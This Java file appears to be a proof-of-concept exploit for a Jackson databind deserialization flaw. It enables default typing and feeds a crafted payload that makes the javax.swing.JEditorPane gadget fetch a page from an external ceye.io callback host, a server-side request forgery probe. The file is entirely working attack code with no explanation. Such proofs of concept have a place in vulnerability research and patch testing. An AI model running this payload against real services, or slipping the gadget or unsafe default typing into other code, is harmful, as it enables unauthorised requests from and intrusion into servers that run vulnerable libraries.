import com.fasterxml.jackson.databind.ObjectMapper;


import java.io.IOException;

public class Poc {
    public static void main(String[] args) throws Exception {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        String payload = "[\"javax.swing.JEditorPane\",{\"page\":\"http://ssrf.0cq48u.ceye.io\"}]";
        try {
            mapper.readValue(payload, Object.class);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}